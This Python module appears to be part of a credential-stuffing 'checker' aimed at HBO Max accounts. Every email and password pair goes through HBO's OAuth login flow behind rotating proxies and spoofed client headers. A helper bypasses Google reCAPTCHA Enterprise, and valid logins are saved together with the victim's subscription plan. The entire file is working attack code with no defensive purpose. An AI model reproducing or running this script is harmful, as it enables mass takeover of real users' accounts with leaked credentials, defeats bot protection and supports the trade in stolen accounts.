from modules.variables import Checker
from modules.functions import bad_proxy, log, save, set_proxy, return_proxy, get_guid,bypass_recaptcha3
from requests import Session
import functools
from requests.adapters import HTTPAdapter, Retry

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                id1 = get_guid()
                id2 = get_guid()
                id3 = get_guid()
                traceid = f'{id2}-{id3}'

                payload = {"client_id":"24fa5e36-3dc4-4ed0-b3f1-29909271b63d","client_secret":"24fa5e36-3dc4-4ed0-b3f1-29909271b63d","scope":"browse video_playback_free account_registration","grant_type":"client_credentials","deviceSerialNumber":id1,"clientDeviceData":{"paymentProviderCode":"apple"}}
                headers = {
                    "Accept": "application/vnd.hbo.v9.full+json" ,
                    "X-B3-TraceId": traceid ,
                    "Accept-Language": "en-in" ,
                    "Accept-Encoding": "gzip, deflate, br" ,
                    "User-Agent": "HBOMAX CFNetwork/1325.0.1 Darwin/21.1.0" ,
                    "Connection": "keep-alive" ,
                    "x-hbo-client-version": "DMX-Web/53.5.0.745099 desktop Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36/N/A" ,
                    "x-hbo-device-name": "desktop" ,
                    "x-hbo-device-os-version": "N/A" ,
                }
                r = s.post('https://oauth.api.hbo.com/auth/tokens',json=payload,headers=headers)
                if 'geo_blocked' in r.text:
                    raise

                refresh_token = r.json()['refresh_token']

                payload = {"grant_type":"refresh_token","refresh_token":refresh_token,"scope":"browse video_playback_free"}
                headers = {
                    "Accept": "application/vnd.hbo.v9.full+json" ,
                    "X-B3-TraceId": traceid ,
                    "Accept-Language": "en-us" ,
                    "Accept-Encoding": "gzip, deflate, br" ,
                    "Content-Type": "application/json" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36" ,
                    "Connection": "keep-alive" ,
                    "x-hbo-client-version": "DMX-Web/53.5.0.745099 desktop Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36/N/A" ,
                    "x-hbo-device-name": "desktop" ,
                    "x-hbo-device-os-version": "N/A" ,
                }
                r = s.post('https://oauth-us.api.hbo.com/auth/tokens',json=payload,headers=headers)
                if 'geo_blocked' in r.text:
                    raise
                
                access_token = r.json()['access_token']

                payload = {"contract":"codex:1.1.4.1","preferredLanguages":["en-US"]}
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" ,
                    "Pragma": "no-cache" ,
                    "authorization": f"Bearer {access_token}" ,
                    "x-hbo-client-version": "DMX-Web/53.5.0.745099 desktop Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36/N/A" ,
                    "x-hbo-device-name": "desktop" ,
                    "x-hbo-device-os-version": "N/A" ,
                    "X-B3-TraceId": traceid ,
                }
                r = s.post('https://sessions.api.hbo.com/sessions/v1/clientConfig',json=payload,headers=headers)
                
                globalization = r.json()['payloadValues']['globalization']
                entitlements = r.json()['payloadValues']['entitlements']
                privacy = r.json()['payloadValues']['privacy']
                profile = r.json()['payloadValues']['profile']
                telemetry = r.json()['payloadValues']['telemetry']

                recap_token = bypass_recaptcha3('https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeMrv8ZAAAAAIcvo5HKvdj1lxtUdHnS13jUCulQ&co=aHR0cHM6Ly9wbGF5Lmhib21heC5jb206NDQz&hl=en&v=MuIyr8Ej74CrXhJDQy37RPBe&size=invisible&cb=f9q60qxahq1b','https://www.google.com/recaptcha/enterprise/reload?k=6LeMrv8ZAAAAAIcvo5HKvdj1lxtUdHnS13jUCulQ')

                payload = {"grant_type":"user_name_password","scope":"browse video_playback device elevated_account_management","username":email,"password":password}
                headers = {
                    "Host": "oauth-us.api.hbo.com" ,
                    "x-hbo-client-version": "DMX-Web/53.5.0.745099 desktop Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36/N/A" ,
                    "x-hbo-device-name": "desktop" ,
                    "x-hbo-device-os-version": "N/A" ,
                    "authorization": f"Bearer {access_token}" ,
                    "Accept": "application/vnd.hbo.v9.full+json" ,
                    "X-B3-TraceId": traceid ,
                    "Accept-Language": "en-us" ,
                    "Accept-Encoding": "gzip, deflate, br" ,
                    "Content-Type": "application/json" ,
                    "User-Agent": "HBOMAX CFNetwork/1325.0.1 Darwin/21.1.0" ,
                    "Connection": "keep-alive" ,
                    "x-recaptchatoken": recap_token ,
                    "x-hbo-headwaiter": f"entitlements:{entitlements},globalization:{globalization},privacy:{privacy},profile:{profile},telemetry:{telemetry}" ,
                }
                r = s.post('https://oauth-emea.api.hbo.com/auth/tokens',json=payload,headers=headers)
                if "{\"statusCode\":401" in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                if "isUserLoggedIn\":true" not in r.text:
                    raise

                token = r.json()['access_token']

                payload = [{"id":"urn:hbo:billing-status:mine"}]
                headers = {
                    "accept": "application/vnd.hbo.v9.full+json" ,
                    "Accept-Encoding": "gzip" ,
                    "Accept-Language": "en-us" ,
                    "authorization": f"Bearer {token}" ,
                    "Connection": "Keep-Alive" ,
                    "Content-Type": "application/json" ,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" ,
                    "X-B3-TraceId": traceid ,
                    "x-hbo-client-version": "DMX-Web/53.5.0.745099 desktop Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" ,
                    "x-hbo-device-name": "desktop" ,
                    "x-hbo-device-os-version": "N/A" ,
                    "x-hbo-headwaiter": f"entitlements:{entitlements},globalization:{globalization},privacy:{privacy},profile:{profile},telemetry:{telemetry}" ,
                    "content-length": "38" 
                }
                r = s.post('https://user-comet-emea.api.hbo.com/content',json=payload,headers=headers)
                if 'expired' in r.text:
                    if not Checker.cui: log("custom",":".join([email,password]),"HBO")
                    save("HBO","custom",Checker.time,":".join([email,password]))
                    Checker.custom += 1
                    return_proxy(proxy)
                    return

                plan = r.json()[0]['body']['billingInformationMessage'].split('Current Plan: ')[1].split(']')[0].replace('[','')
                if not Checker.cui: log("good",':'.join([email,password]),"HBO")
                save("HBO","good",Checker.time,':'.join([email,password])+f" Plan: {plan}")
                Checker.good += 1
                return_proxy(proxy)
                return

        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1